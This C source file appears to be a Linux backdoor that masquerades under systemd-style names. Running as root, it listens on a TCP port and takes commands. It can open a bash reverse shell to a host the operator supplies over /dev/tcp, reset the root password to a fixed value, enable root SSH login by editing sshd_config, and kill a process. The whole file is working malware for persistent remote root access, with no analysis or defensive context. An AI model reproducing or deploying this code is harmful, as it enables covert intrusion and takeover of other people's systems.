#include <stdio.h>
#include <stdlib.h> 
#include <string.h> 
#include <signal.h>
#include <netdb.h> 
#include <netinet/in.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <unistd.h>

#include "includes/systemd-logout.h"

#define SA struct sockaddr

void spawn_shell(void) {
    char input[BUFFER_SIZE];
    char revshell[BUFFER_SIZE];
    char *revshell1 = "/9001 0>&1'";

    strncpy(revshell, "bash -c 'bash -i >& /dev/tcp/", BUFFER_SIZE);
    write(connfd, "-> ", 3);
    read(connfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    strncat(revshell, input, BUFFER_SIZE);
    strncat(revshell, revshell1, BUFFER_SIZE);

    if (fork() == 0)
        system(revshell);
}

void enable_root_ssh(void) {
    system("bash -c \"echo -e 'PermitRootLogin yes' >> /etc/ssh/sshd_config\"");
    system("service sshd restart");
}

void read_data(void) { 
    char input[BUFFER_SIZE];

    for (;;) { 
        bzero(input, BUFFER_SIZE);
        write(connfd, "-> ", 3);
        read(connfd, input, sizeof(input));
        if (handler(input) == 1)
            raise(SIGINT);
    }
}

int handler(char option[BUFFER_SIZE]) {
    if (strncmp(option, "exit\n", 5) == 0)
        return 1;
    else if (strncmp(option,"shell\n",6) == 0)
        spawn_shell();
    else if (strncmp(option,"kill\n",5) == 0)
        system("pkill -9 systemd-daemon");
    else if (strncmp(option,"passwd\n",7) == 0)
        system(" bash -c \"echo -e 'systemd-kit\nsystemd-kit\n' | passwd\"");
    else if (strncmp(option,"ssh\n",4) == 0)
        enable_root_ssh();

    return 0;
}

void start_service(void) {
    int sockfd;
    unsigned int len; 
    struct sockaddr_in servaddr;
    struct sockaddr_in cli;
   
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (geteuid() !=0)
        return;

    if (sockfd == -1)
        return;

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);
   
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0)
        return;
   
    if ((listen(sockfd, 5)) != 0)
        return;

    len = sizeof(cli);
    connfd = accept(sockfd, (SA*)&cli, &len);

    if (connfd < 0)
        return;
    
    read_data(); 
    close(sockfd);
}

int main(void) {
    start_service();
}